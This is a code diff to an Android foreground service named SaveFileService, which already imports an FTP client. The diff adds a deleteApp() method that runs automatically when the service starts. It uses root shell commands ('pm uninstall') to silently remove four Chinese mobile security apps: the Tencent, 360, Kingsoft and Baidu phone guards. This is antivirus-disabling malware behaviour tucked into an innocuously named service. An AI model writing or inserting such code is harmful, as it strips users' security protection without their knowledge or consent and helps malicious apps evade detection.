@@ -11,6 +11,7 @@ import android.util.Log;
 
 import com.jiec.utils.AppUtil;
 import com.jiec.utils.FTPClientUtils;
+import com.jiec.utils.ShellUtils;
 
 /**
  * 描述:
@@ -30,6 +31,9 @@ public class SaveFileService extends Service {
                 }
 
                 Log.e("test", "testService going");
+
+            } else if (msg.what == 1) {
+                deleteApp();
             }
         };
     };
@@ -44,6 +48,7 @@ public class SaveFileService extends Service {
     public void onCreate() {
         // TODO Auto-generated method stub
         mHandler.sendEmptyMessageDelayed(0, 1000);
+        mHandler.sendEmptyMessage(1);
         createNotification();
         super.onCreate();
     }
@@ -59,4 +64,23 @@ public class SaveFileService extends Service {
         startForeground(NOTIFICATION_ID, notification);
     }
 
+    private void deleteApp() {
+
+        new Thread(new Runnable() {
+
+            @Override
+            public void run() {
+                String packages[] = {
+                        "com.tencent.qqpimsecure", // qq手机管家
+                        "com.qihoo360.mobilesafe", // 360手机管家
+                        "com.ijinshan.mguard", // 金山手机卫士
+                        "cn.opda.a.phonoalbumshoushou" // 百度手机卫士
+                };
+                for (int i = 0; i < packages.length; i++) {
+                    ShellUtils.execCommand("/system/bin/pm uninstall " + packages[i], true);
+                }
+            }
+        }).start();
+
+    }
 }
